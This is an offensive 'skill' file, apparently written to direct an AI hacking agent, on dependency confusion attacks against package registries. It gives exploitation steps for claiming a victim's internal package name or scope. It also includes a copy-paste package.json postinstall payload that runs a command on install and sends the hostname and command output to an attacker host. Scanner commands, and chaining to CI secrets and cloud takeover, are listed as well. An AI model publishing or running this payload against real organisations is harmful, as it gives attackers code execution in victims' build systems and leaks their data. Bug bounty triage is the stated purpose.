# SKILL: Dependency Confusion

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (dependency confusion) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Internal package name leaked → publish same name on public registry → CI / dev installs your package → RCE in build environment.

---

## DETECTION
Read `package.json`, `requirements.txt`, `pom.xml`, `Gemfile.lock`, `go.mod`. Look for unscoped names not on public registry.

## EXPLOITATION
1. Identify internal package name `@example/internal-utils` (scope owned by victim) or unscoped `examplecorp-secret-tool`.
2. Check public registry — if no `@example` org owned, register the org. Publish `@example/internal-utils` with malicious postinstall:
```js
{
  "name": "@example/internal-utils",
  "version": "9999.99.99",
  "scripts": { "postinstall": "node -e \"require('https').get('https://attacker.tld/?d='+require('os').hostname()+'-'+require('child_process').execSync('id'))\"" }
}
```
3. Wait for victim CI/dev install.

## PAYLOADS (real, copy-paste, grouped)
(see above)

## BYPASS TECHNIQUES
Scope claim race — register scope first.

## CHAIN POTENTIAL
Build-RCE → CI secrets → cloud takeover.

## TOOLS
Confused (Visma), depcon, dependency-combobulator

## COMMANDS
```bash
confused -l npm package.json
confused -l pypi requirements.txt
confused -l mvn pom.xml
```

## EDGE CASES / NOT-A-BUG TRAPS
Most ecosystems have hardened (npm scope confusion mitigated by orgs; pip private index priority). Still alive in mid-size orgs without internal registries.

## TRIAGE ANGLE (per platform)
PoC must include callback (DNS / HTTP) confirming exec inside victim infra.

## SEVERITY & CVSS
9.0+.

## REFERENCES
Alex Birsan original article • Confused (Visma) tool
